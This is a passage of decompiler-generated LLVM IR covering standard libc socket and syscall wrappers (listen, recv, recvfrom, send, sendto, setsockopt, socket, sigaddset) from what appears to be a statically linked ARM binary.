  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_103f4 = load i32, i32* @r4, align 4
  store i32 %v3_103f4, i32* %stack_var_-12, align 4
  %v0_10404 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10404, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10404, -4095
  br i1 %tmp, label %dec_label_pc_1042c, label %dec_label_pc_10414

dec_label_pc_10414:                               ; preds = %entry
  %v0_10418 = call i32 @__aeabi_read_tp()
  %v3_1041c = load i16, i16* @global_var_20d4c.598, align 2
  %v4_1041c = sext i16 %v3_1041c to i32
  %v0_10420 = load i32, i32* %r2.global-to-local, align 4
  %v1_10420 = sub i32 0, %v0_10420
  store i32 %v1_10420, i32* %r2.global-to-local, align 4
  %v3_10424 = add i32 %v4_1041c, %v0_10418
  %v4_10424 = inttoptr i32 %v3_10424 to i32*
  store i32 %v1_10420, i32* %v4_10424, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1042c.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1042c

dec_label_pc_1042c:                               ; preds = %entry, %dec_label_pc_10414
  %v1_10430 = phi i32 [ %v0_10404, %entry ], [ -1, %dec_label_pc_10414 ]
  %v2_1042c = phi i32 [ %v3_103f4, %entry ], [ %v2_1042c.pre, %dec_label_pc_10414 ]
  store i32 %v2_1042c, i32* @r4, align 4
  ret i32 %v1_10430

; uselistorder directives
  uselistorder i32 %v0_10404, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1042c, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10434:
  %v0_10434 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10434, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10434
  %v2_10438 = load i32, i32* @r8, align 4
  %v5_10438 = udiv i32 %v2_10438, 262144
  %v6_10438 = and i32 %v5_10438, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10434, %bb
  %v7_10438 = phi i32 [ %arg1, %dec_label_pc_10434 ], [ %v6_10438, %bb ]
  ret i32 %v7_10438

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10470, label %dec_label_pc_10458

dec_label_pc_10458:                               ; preds = %entry
  %v0_1045c = call i32 @__aeabi_read_tp()
  %v3_10460 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_10460 = sext i16 %v3_10460 to i32
  %v0_10464 = load i32, i32* %r2.global-to-local, align 4
  %v1_10464 = sub i32 0, %v0_10464
  store i32 %v1_10464, i32* %r2.global-to-local, align 4
  %v3_10468 = add i32 %v4_10460, %v0_1045c
  %v4_10468 = inttoptr i32 %v3_10468 to i32*
  store i32 %v1_10464, i32* %v4_10468, align 4
  br label %dec_label_pc_10470

dec_label_pc_10470:                               ; preds = %entry, %dec_label_pc_10458
  %v1_10474 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_10458 ]
  ret i32 %v1_10474

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10470, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1047c = load i32, i32* @r7, align 4
  store i32 %v3_1047c, i32* %stack_var_-8, align 4
  %v0_10488 = load i32, i32* @r0, align 4
  store i32 %v0_10488, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10488, -4095
  br i1 %tmp, label %dec_label_pc_104b0, label %dec_label_pc_10498

dec_label_pc_10498:                               ; preds = %entry
  %v0_1049c = call i32 @__aeabi_read_tp()
  %v3_104a0 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_104a0 = sext i16 %v3_104a0 to i32
  %v0_104a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_104a4 = sub i32 0, %v0_104a4
  store i32 %v1_104a4, i32* %r2.global-to-local, align 4
  %v3_104a8 = add i32 %v4_104a0, %v0_1049c
  %v4_104a8 = inttoptr i32 %v3_104a8 to i32*
  store i32 %v1_104a4, i32* %v4_104a8, align 4
  %v2_104b0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_104b0

dec_label_pc_104b0:                               ; preds = %entry, %dec_label_pc_10498
  %v1_104b4 = phi i32 [ %v0_10488, %entry ], [ -1, %dec_label_pc_10498 ]
  %v2_104b0 = phi i32 [ %v3_1047c, %entry ], [ %v2_104b0.pre, %dec_label_pc_10498 ]
  store i32 %v2_104b0, i32* @r7, align 4
  ret i32 %v1_104b4

; uselistorder directives
  uselistorder i32 %v0_10488, { 1, 0, 2 }
  uselistorder label %dec_label_pc_104b0, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_104b8:
  %v0_104b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_104b8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_104b8
  %v2_104bc = load i32, i32* @r4, align 4
  %v5_104bc = udiv i32 %v2_104bc, 131072
  %v6_104bc = and i32 %v5_104bc, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_104b8, %bb
  %v7_104bc = phi i32 [ %arg1, %dec_label_pc_104b8 ], [ %v6_104bc, %bb ]
  ret i32 %v7_104bc

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_104c4 = load i32, i32* @r4, align 4
  store i32 %v3_104c4, i32* %stack_var_-24, align 4
  %v6_104c4 = load i32, i32* @r5, align 4
  %v9_104c4 = load i32, i32* @r6, align 4
  %v12_104c4 = load i32, i32* @r7, align 4
  %v15_104c4 = load i32, i32* @r8, align 4
  %v18_104c4 = load i32, i32* @lr, align 4
  %v4_104d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 12684) to i32*), align 4
  %v2_104d4 = icmp eq i32 %v4_104d0, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_104d4, label %dec_label_pc_104ec, label %entry.dec_label_pc_104f4_crit_edge

entry.dec_label_pc_104f4_crit_edge:               ; preds = %entry
  br label %dec_label_pc_104f4

dec_label_pc_104ec:                               ; preds = %entry
  store i32 %v3_104c4, i32* @r4, align 4
  store i32 %v9_104c4, i32* @r6, align 4
  store i32 %v12_104c4, i32* @r7, align 4
  store i32 %v15_104c4, i32* @r8, align 4
  %v0_104f0 = call i32 @__sys_recv()
  br label %dec_label_pc_104f4

dec_label_pc_104f4:                               ; preds = %entry.dec_label_pc_104f4_crit_edge, %dec_label_pc_104ec
  %v0_104f4 = call i32 @__libc_enable_asynccancel()
  %v0_104f8 = load i32, i32* @r6, align 4
  store i32 %v0_104f8, i32* @r1, align 4
  store i32 %v0_104f4, i32* @r5, align 4
  %v0_10508 = load i32, i32* @r4, align 4
  store i32 %v0_10508, i32* @r0, align 4
  %v0_1050c = call i32 @__sys_recv()
  store i32 %v0_1050c, i32* @r4, align 4
  %v0_10514 = load i32, i32* @r5, align 4
  %v1_10518 = call i32 @__libc_disable_asynccancel(i32 %v0_10514)
  %v0_1051c = load i32, i32* @r4, align 4
  %v2_10520 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10520, i32* @r4, align 4
  store i32 %v6_104c4, i32* @r5, align 4
  store i32 %v9_104c4, i32* @r6, align 4
  store i32 %v12_104c4, i32* @r7, align 4
  store i32 %v15_104c4, i32* @r8, align 4
  store i32 %v18_104c4, i32* @lr, align 4
  ret i32 %v0_1051c

; uselistorder directives
  uselistorder label %dec_label_pc_104f4, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10530 = load i32, i32* @r4, align 4
  store i32 %v3_10530, i32* %stack_var_-16, align 4
  %v0_10544 = load i32, i32* @r0, align 4
  store i32 %v0_10544, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10544, -4095
  br i1 %tmp, label %dec_label_pc_1056c, label %dec_label_pc_10554

dec_label_pc_10554:                               ; preds = %entry
  %v0_10558 = call i32 @__aeabi_read_tp()
  %v3_1055c = load i16, i16* @global_var_20d4c.598, align 2
  %v4_1055c = sext i16 %v3_1055c to i32
  %v0_10560 = load i32, i32* %r2.global-to-local, align 4
  %v1_10560 = sub i32 0, %v0_10560
  store i32 %v1_10560, i32* %r2.global-to-local, align 4
  %v3_10564 = add i32 %v4_1055c, %v0_10558
  %v4_10564 = inttoptr i32 %v3_10564 to i32*
  store i32 %v1_10560, i32* %v4_10564, align 4
  %v2_1056c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1056c

dec_label_pc_1056c:                               ; preds = %entry, %dec_label_pc_10554
  %v1_10570 = phi i32 [ %v0_10544, %entry ], [ -1, %dec_label_pc_10554 ]
  %v2_1056c = phi i32 [ %v3_10530, %entry ], [ %v2_1056c.pre, %dec_label_pc_10554 ]
  store i32 %v2_1056c, i32* @r4, align 4
  ret i32 %v1_10570

; uselistorder directives
  uselistorder i32 %v0_10544, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1056c, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_10578 = load i32, i32* @r4, align 4
  store i32 %v3_10578, i32* %stack_var_-32, align 4
  %v6_10578 = load i32, i32* @r5, align 4
  %v9_10578 = load i32, i32* @r6, align 4
  %v12_10578 = load i32, i32* @r7, align 4
  %v15_10578 = load i32, i32* @r8, align 4
  %v18_10578 = load i32, i32* @sb, align 4
  %v21_10578 = load i32, i32* @sl, align 4
  %v24_10578 = load i32, i32* @lr, align 4
  %v4_10588 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 12684) to i32*), align 4
  %v2_10590 = icmp eq i32 %v4_10588, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_10590, label %dec_label_pc_105b0, label %dec_label_pc_105bc

dec_label_pc_105b0:                               ; preds = %entry
  store i32 %v3_10578, i32* @r4, align 4
  store i32 %v12_10578, i32* @r7, align 4
  store i32 %v15_10578, i32* @r8, align 4
  store i32 %v18_10578, i32* %sb.global-to-local, align 4
  %v0_105b8 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_105bc

dec_label_pc_105bc:                               ; preds = %entry, %dec_label_pc_105b0
  %v0_105bc = call i32 @__libc_enable_asynccancel()
  store i32 %v0_105bc, i32* @r5, align 4
  %v0_105d0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_105d0, i32* @r0, align 4
  %v0_105d8 = call i32 @__sys_recvfrom()
  store i32 %v0_105d8, i32* @r4, align 4
  %v0_105e0 = load i32, i32* @r5, align 4
  %v1_105e4 = call i32 @__libc_disable_asynccancel(i32 %v0_105e0)
  %v0_105e8 = load i32, i32* @r4, align 4
  %v2_105f0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_105f0, i32* @r4, align 4
  store i32 %v6_10578, i32* @r5, align 4
  store i32 %v9_10578, i32* @r6, align 4
  store i32 %v12_10578, i32* @r7, align 4
  store i32 %v15_10578, i32* @r8, align 4
  store i32 %v18_10578, i32* @sb, align 4
  store i32 %v21_10578, i32* @sl, align 4
  store i32 %v24_10578, i32* @lr, align 4
  ret i32 %v0_105e8

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_105bc, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10600 = load i32, i32* @r7, align 4
  store i32 %v3_10600, i32* %stack_var_-8, align 4
  %v0_1060c = load i32, i32* @r0, align 4
  store i32 %v0_1060c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1060c, -4095
  br i1 %tmp, label %dec_label_pc_10634, label %dec_label_pc_1061c

dec_label_pc_1061c:                               ; preds = %entry
  %v0_10620 = call i32 @__aeabi_read_tp()
  %v3_10624 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_10624 = sext i16 %v3_10624 to i32
  store i32 %v4_10624, i32* @r3, align 4
  %v0_10628 = load i32, i32* %r2.global-to-local, align 4
  %v1_10628 = sub i32 0, %v0_10628
  store i32 %v1_10628, i32* %r2.global-to-local, align 4
  %v3_1062c = add i32 %v4_10624, %v0_10620
  %v4_1062c = inttoptr i32 %v3_1062c to i32*
  store i32 %v1_10628, i32* %v4_1062c, align 4
  %v2_10634.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10634

dec_label_pc_10634:                               ; preds = %entry, %dec_label_pc_1061c
  %v1_10638 = phi i32 [ %v0_1060c, %entry ], [ -1, %dec_label_pc_1061c ]
  %v2_10634 = phi i32 [ %v3_10600, %entry ], [ %v2_10634.pre, %dec_label_pc_1061c ]
  store i32 %v2_10634, i32* @r7, align 4
  ret i32 %v1_10638

; uselistorder directives
  uselistorder i32 %v0_1060c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10634, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1063c:
  %v0_1063c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1063c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1063c
  %v5_1063c = udiv i32 %arg2, 4
  %v6_1063c = and i32 %v5_1063c, %arg1
  %v5_10640 = udiv i32 %v6_1063c, 16384
  %v6_10640 = and i32 %v5_10640, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1063c, %bb
  %v7_10640 = phi i32 [ %arg1, %dec_label_pc_1063c ], [ %v6_10640, %bb ]
  ret i32 %v7_10640

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10648 = load i32, i32* @r4, align 4
  store i32 %v3_10648, i32* %stack_var_-24, align 4
  %v6_10648 = load i32, i32* @r5, align 4
  %v9_10648 = load i32, i32* @r6, align 4
  %v12_10648 = load i32, i32* @r7, align 4
  %v15_10648 = load i32, i32* @r8, align 4
  %v18_10648 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @ip, align 4
  %v4_10654 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 12684) to i32*), align 4
  %v2_10658 = icmp eq i32 %v4_10654, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_10658, label %dec_label_pc_10670, label %entry.dec_label_pc_10678_crit_edge

entry.dec_label_pc_10678_crit_edge:               ; preds = %entry
  br label %dec_label_pc_10678

dec_label_pc_10670:                               ; preds = %entry
  store i32 %v3_10648, i32* @r4, align 4
  store i32 %v9_10648, i32* @r6, align 4
  store i32 %v12_10648, i32* @r7, align 4
  store i32 %v15_10648, i32* @r8, align 4
  %v0_10674 = call i32 @__sys_send()
  br label %dec_label_pc_10678

dec_label_pc_10678:                               ; preds = %entry.dec_label_pc_10678_crit_edge, %dec_label_pc_10670
  %v0_10678 = call i32 @__libc_enable_asynccancel()
  %v0_1067c = load i32, i32* @r6, align 4
  store i32 %v0_1067c, i32* @r1, align 4
  store i32 %v0_10678, i32* @r5, align 4
  %v0_10688 = load i32, i32* @r8, align 4
  store i32 %v0_10688, i32* @r3, align 4
  %v0_1068c = load i32, i32* @r4, align 4
  store i32 %v0_1068c, i32* @r0, align 4
  %v0_10690 = call i32 @__sys_send()
  store i32 %v0_10690, i32* @r4, align 4
  %v0_10698 = load i32, i32* @r5, align 4
  %v1_1069c = call i32 @__libc_disable_asynccancel(i32 %v0_10698)
  %v0_106a0 = load i32, i32* @r4, align 4
  %v2_106a4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_106a4, i32* @r4, align 4
  store i32 %v6_10648, i32* @r5, align 4
  store i32 %v9_10648, i32* @r6, align 4
  store i32 %v12_10648, i32* @r7, align 4
  store i32 %v15_10648, i32* @r8, align 4
  store i32 %v18_10648, i32* @lr, align 4
  ret i32 %v0_106a0

; uselistorder directives
  uselistorder label %dec_label_pc_10678, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_106b4 = load i32, i32* @r4, align 4
  store i32 %v3_106b4, i32* %stack_var_-16, align 4
  %v0_106c8 = load i32, i32* @r0, align 4
  store i32 %v0_106c8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_106c8, -4095
  br i1 %tmp, label %dec_label_pc_106f0, label %dec_label_pc_106d8

dec_label_pc_106d8:                               ; preds = %entry
  %v0_106dc = call i32 @__aeabi_read_tp()
  %v3_106e0 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_106e0 = sext i16 %v3_106e0 to i32
  %v0_106e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_106e4 = sub i32 0, %v0_106e4
  store i32 %v1_106e4, i32* %r2.global-to-local, align 4
  %v3_106e8 = add i32 %v4_106e0, %v0_106dc
  %v4_106e8 = inttoptr i32 %v3_106e8 to i32*
  store i32 %v1_106e4, i32* %v4_106e8, align 4
  %v2_106f0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_106f0

dec_label_pc_106f0:                               ; preds = %entry, %dec_label_pc_106d8
  %v1_106f4 = phi i32 [ %v0_106c8, %entry ], [ -1, %dec_label_pc_106d8 ]
  %v2_106f0 = phi i32 [ %v3_106b4, %entry ], [ %v2_106f0.pre, %dec_label_pc_106d8 ]
  store i32 %v2_106f0, i32* @r4, align 4
  ret i32 %v1_106f4

; uselistorder directives
  uselistorder i32 %v0_106c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_106f0, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_106f8:
  %v0_106f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_106f8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_106f8
  %v2_106fc = load i32, i32* @r4, align 4
  %v3_106fc = udiv i32 %v2_106fc, 4096
  %v4_106fc = mul i32 %v2_106fc, 1048576
  %v5_106fc = or i32 %v3_106fc, %v4_106fc
  %v8_106fc = and i32 %v5_106fc, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_106f8, %bb
  %v9_106fc = phi i32 [ %arg1, %dec_label_pc_106f8 ], [ %v8_106fc, %bb ]
  ret i32 %v9_106fc

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_10700 = load i32, i32* @r4, align 4
  store i32 %v3_10700, i32* %stack_var_-32, align 4
  %v6_10700 = load i32, i32* @r5, align 4
  %v9_10700 = load i32, i32* @r6, align 4
  %v12_10700 = load i32, i32* @r7, align 4
  %v15_10700 = load i32, i32* @r8, align 4
  %v18_10700 = load i32, i32* @sb, align 4
  %v21_10700 = load i32, i32* @sl, align 4
  %v24_10700 = load i32, i32* @lr, align 4
  %v4_10710 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 12684) to i32*), align 4
  %v2_10718 = icmp eq i32 %v4_10710, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_10718, label %dec_label_pc_10738, label %dec_label_pc_10744

dec_label_pc_10738:                               ; preds = %entry
  store i32 %v3_10700, i32* @r4, align 4
  store i32 %v12_10700, i32* @r7, align 4
  store i32 %v15_10700, i32* @r8, align 4
  store i32 %v18_10700, i32* %sb.global-to-local, align 4
  %v0_10740 = call i32 @__sys_sendto()
  br label %dec_label_pc_10744

dec_label_pc_10744:                               ; preds = %entry, %dec_label_pc_10738
  %v0_10744 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10744, i32* @r5, align 4
  %v0_10758 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_10758, i32* @r0, align 4
  %v0_10760 = call i32 @__sys_sendto()
  store i32 %v0_10760, i32* @r4, align 4
  %v0_10768 = load i32, i32* @r5, align 4
  %v1_1076c = call i32 @__libc_disable_asynccancel(i32 %v0_10768)
  %v0_10770 = load i32, i32* @r4, align 4
  %v2_10778 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10778, i32* @r4, align 4
  store i32 %v6_10700, i32* @r5, align 4
  store i32 %v9_10700, i32* @r6, align 4
  store i32 %v12_10700, i32* @r7, align 4
  store i32 %v15_10700, i32* @r8, align 4
  store i32 %v18_10700, i32* @sb, align 4
  store i32 %v21_10700, i32* @sl, align 4
  store i32 %v24_10700, i32* @lr, align 4
  ret i32 %v0_10770

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10744, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10788 = load i32, i32* @r4, align 4
  store i32 %v3_10788, i32* %stack_var_-12, align 4
  %v0_10798 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10798, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10798, -4095
  br i1 %tmp, label %dec_label_pc_107c0, label %dec_label_pc_107a8

dec_label_pc_107a8:                               ; preds = %entry
  %v0_107ac = call i32 @__aeabi_read_tp()
  %v3_107b0 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_107b0 = sext i16 %v3_107b0 to i32
  store i32 %v4_107b0, i32* @r3, align 4
  %v0_107b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_107b4 = sub i32 0, %v0_107b4
  store i32 %v1_107b4, i32* %r2.global-to-local, align 4
  %v3_107b8 = add i32 %v4_107b0, %v0_107ac
  %v4_107b8 = inttoptr i32 %v3_107b8 to i32*
  store i32 %v1_107b4, i32* %v4_107b8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_107c0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_107c0

dec_label_pc_107c0:                               ; preds = %entry, %dec_label_pc_107a8
  %v1_107c4 = phi i32 [ %v0_10798, %entry ], [ -1, %dec_label_pc_107a8 ]
  %v2_107c0 = phi i32 [ %v3_10788, %entry ], [ %v2_107c0.pre, %dec_label_pc_107a8 ]
  store i32 %v2_107c0, i32* @r4, align 4
  ret i32 %v1_107c4

; uselistorder directives
  uselistorder i32 %v0_10798, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_107c0, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1) local_unnamed_addr {
dec_label_pc_107c8:
  %v0_107c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_107c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_107c8
  %v2_107c8 = load i32, i32* @r6, align 4
  %v5_107c8 = udiv i32 %v2_107c8, 4
  %v6_107c8 = and i32 %v5_107c8, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_107c8, %bb
  %v4_107cc = phi i32 [ %arg1, %dec_label_pc_107c8 ], [ %v6_107c8, %bb ]
  ret i32 %v4_107cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_107d0 = load i32, i32* @r7, align 4
  store i32 %v3_107d0, i32* %stack_var_-8, align 4
  %v0_107dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_107dc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_107dc, -4095
  br i1 %tmp, label %dec_label_pc_10804, label %dec_label_pc_107ec

dec_label_pc_107ec:                               ; preds = %entry
  %v0_107f0 = call i32 @__aeabi_read_tp()
  %v3_107f4 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_107f4 = sext i16 %v3_107f4 to i32
  store i32 %v4_107f4, i32* @r3, align 4
  %v0_107f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_107f8 = sub i32 0, %v0_107f8
  store i32 %v1_107f8, i32* %r2.global-to-local, align 4
  %v3_107fc = add i32 %v4_107f4, %v0_107f0
  %v4_107fc = inttoptr i32 %v3_107fc to i32*
  store i32 %v1_107f8, i32* %v4_107fc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10804.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10804

dec_label_pc_10804:                               ; preds = %entry, %dec_label_pc_107ec
  %v1_10808 = phi i32 [ %v0_107dc, %entry ], [ -1, %dec_label_pc_107ec ]
  %v2_10804 = phi i32 [ %v3_107d0, %entry ], [ %v2_10804.pre, %dec_label_pc_107ec ]
  store i32 %v2_10804, i32* @r7, align 4
  ret i32 %v1_10808

; uselistorder directives
  uselistorder i32 %v0_107dc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10804, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1080c:
  %v0_1080c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1080c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1080c
  %v2_1080c = load i32, i32* @sb, align 4
  %v8_1080c = shl i32 %v2_1080c, %arg2
  %v9_1080c = and i32 %v8_1080c, %arg1
  %v3_10810 = load i32, i32* @r5, align 4
  %v8_10810 = ashr i32 %v9_1080c, %v3_10810
  %v9_10810 = and i32 %v8_10810, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1080c, %bb
  %v10_10810 = phi i32 [ %arg1, %dec_label_pc_1080c ], [ %v9_10810, %bb ]
  ret i32 %v10_10810

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_1082c, label %dec_label_pc_10824

dec_label_pc_10824:                               ; preds = %entry
  %v7_10828 = icmp slt i32 %arg2, 65
  br i1 %v7_10828, label %dec_label_pc_10848, label %dec_label_pc_1082c

dec_label_pc_1082c:                               ; preds = %dec_label_pc_10824, %entry
  %v0_10830 = call i32 @__aeabi_read_tp()
  %v3_10834 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_10834 = sext i16 %v3_10834 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_10840 = add i32 %v4_10834, %v0_10830
  %v4_10840 = inttoptr i32 %v3_10840 to i32*
  store i32 22, i32* %v4_10840, align 4
  %v0_10850.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10850

dec_label_pc_10848:                               ; preds = %dec_label_pc_10824
  %v0_10848 = call i32 @__sigaddset()
  store i32 %v0_10848, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10850

dec_label_pc_10850:                               ; preds = %dec_label_pc_1082c, %dec_label_pc_10848
  %v0_10850 = phi i32 [ %v0_10850.pre, %dec_label_pc_1082c ], [ %v0_10848, %dec_label_pc_10848 ]
  ret i32 %v0_10850

; uselistorder directives
